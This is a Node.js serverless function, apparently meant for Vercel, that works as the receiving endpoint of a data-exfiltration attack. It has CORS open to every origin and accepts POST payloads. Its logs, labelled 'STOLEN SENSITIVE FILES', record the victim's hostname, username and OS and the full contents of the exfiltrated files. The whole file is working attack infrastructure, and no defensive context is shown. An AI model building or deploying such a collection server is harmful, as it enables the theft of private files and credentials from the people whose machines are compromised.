module.exports = (req, res) => {
  // Enable CORS
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  // Handle preflight requests
  if (req.method === 'OPTIONS') {
    res.status(200).end();
    return;
  }

  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const exfiltrationData = req.body;
    
    // Log the exfiltrated data to console (visible in Vercel logs)
    console.log('🔥 DATA EXFILTRATION DETECTED! 🔥');
    console.log('Time:', new Date().toISOString());
    console.log('Session ID:', exfiltrationData.session_id);
    console.log('Timestamp:', exfiltrationData.timestamp);
    
    if (exfiltrationData.metadata) {
      console.log('Victim Info:');
      console.log('  Hostname:', exfiltrationData.metadata.hostname);
      console.log('  User:', exfiltrationData.metadata.user);
      console.log('  OS:', exfiltrationData.metadata.os);
    }
    
    console.log('📁 STOLEN SENSITIVE FILES:');
    console.log('='.repeat(50));
    
    if (exfiltrationData.files) {
      Object.entries(exfiltrationData.files).forEach(([filePath, content]) => {
        console.log(`📄 File: ${filePath}`);
        console.log('Content:');
        console.log(content);
        console.log('-'.repeat(30));
      });
    }
    
    // Also log the full payload for debugging
    console.log('Full exfiltration payload:', JSON.stringify(exfiltrationData, null, 2));
    
    // Return success response
    res.status(200).json({ 
      success: true, 
      message: 'Data received successfully',
      timestamp: new Date().toISOString()
    });
    
  } catch (error) {
    console.error('Error processing exfiltration data:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
}; 